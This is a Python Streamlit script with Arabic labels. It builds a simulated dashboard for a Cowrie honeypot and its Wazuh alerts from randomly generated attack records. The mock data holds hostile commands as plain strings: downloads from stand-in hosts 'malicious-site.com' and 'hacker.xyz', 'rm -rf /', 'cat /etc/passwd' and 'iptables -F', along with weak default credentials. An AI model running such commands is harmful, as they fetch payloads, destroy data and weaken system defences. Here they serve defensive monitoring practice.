import streamlit as st
import pandas as pd
import plotly.express as px
import random
import time
from datetime import datetime

# إعدادات الصفحة
st.set_page_config(page_title="Cyber Shield - HoneyPot Dashboard", layout="wide")

# --- 1. توليد بيانات محاكاة (Mock Data) ---
@st.cache_data
def load_initial_data():
    ips = ["192.168.1.50", "45.227.254.12", "185.156.177.34", "103.204.170.54", "82.102.23.11"]
    countries = ["Saudi Arabia", "United States", "Russia", "China", "Germany"]
    usernames = ["root", "admin", "user", "support", "ubuntu"]
    passwords = ["123456", "password", "root", "admin123", "qwerty"]
    commands = ["whoami", "uname -a", "wget http://malicious-site.com/malware.sh", "cat /etc/passwd", "rm -rf /"]
    
    data = []
    for i in range(20):
        idx = random.randint(0, 4)
        data.append({
            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "Attacker IP": ips[idx],
            "Country": countries[idx],
            "Username Used": random.choice(usernames),
            "Password Used": random.choice(passwords),
            "Command Executed": random.choice(commands),
            "Severity": random.choice(["Low", "Medium", "High", "Critical"])
        })
    return pd.DataFrame(data)

# تحميل البيانات
if 'df' not in st.session_state:
    st.session_state.df = load_initial_data()

# --- 2. تصميم واجهة المستخدم (UI) ---
st.title("🛡️ نظام مراقبة وتحليل Cowrie HoneyPot (محاكاة)")
st.subheader("إرسال السجلات وتحليل التنبيهات الأمنية عبر منصة مراقبة مخصصة")
st.markdown("---")

# مؤشرات الأداء الرئيسية (KPIs)
col1, col2, col3, col4 = st.columns(4)
total_attacks = len(st.session_state.df)
critical_attacks = len(st.session_state.df[st.session_state.df['Severity'] == 'Critical'])
unique_ips = st.session_state.df['Attacker IP'].nunique()

col1.metric(label="إجمالي محاولات الاختراق", value=total_attacks)
col2.metric(label="هجمات عالية الخطورة (Critical)", value=critical_attacks, delta_color="inverse")
col3.metric(label="عدد المهاجمين الفريدين (IPs)", value=unique_ips)
col4.metric(label="حالة الهوني بوت (Cowrie)", value="نشط / يستقبل", delta="Online")

st.markdown("---")

# --- 3. قسم الرسوم البيانية التفاعلية ---
st.subheader("📊 التحليل الإحصائي للهجمات")
chart_col1, chart_col2 = st.columns(2)

with chart_col1:
    # الرسم البياني للدول الأكثر هجوماً
    country_counts = st.session_state.df['Country'].value_counts().reset_index()
    fig_country = px.bar(country_counts, x='Country', y='count', title="الدول الأكثر استهدافاً للهوني بوت", labels={'count': 'عدد الهجمات'}, color='Country')
    st.plotly_chart(fig_country, use_container_width=True)

with chart_col2:
    # الرسم البياني لمستوى خطورة العمليات
    severity_counts = st.session_state.df['Severity'].value_counts().reset_index()
    fig_sev = px.pie(severity_counts, values='count', names='Severity', title="توزيع مستويات الخطورة (Wazuh Rules Analysis)", color_discrete_sequence=px.colors.sequential.RdBu)
    st.plotly_chart(fig_sev, use_container_width=True)

st.markdown("---")

# --- 4. جدول السجلات الحية والتنبيهات ---
st.subheader("📋 سجل العمليات المباشر (Live Logs / Wazuh Alerts)")

# عرض البيانات في جدول أنيق
st.dataframe(st.session_state.df.sort_index(ascending=False), use_container_width=True)

# زر لمحاكاة هجوم جديد فوراً
if st.button("🚨 محاكاة هجوم جديد (توليد سجل تلقائي)"):
    new_attack = {
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Attacker IP": random.choice(["172.56.21.89", "91.211.88.10", "202.45.78.123"]),
        "Country": random.choice(["Iran", "North Korea", "Brazil"]),
        "Username Used": random.choice(["root", "admin"]),
        "Password Used": random.choice(["admin", "12345"]),
        "Command Executed": random.choice(["curl -O http://hacker.xyz/backdoor", "iptables -F"]),
        "Severity": "Critical"
    }
    # إضافة الهجوم الجديد لأعلى الجدول
    st.session_state.df = pd.concat([pd.DataFrame([new_attack]), st.session_state.df], ignore_index=True)
    st.success("تم رصد محاولة اختراق جديدة وإرسال السجل إلى لوحة التحكم!")
    time.sleep(0.5)
    st.rerun()
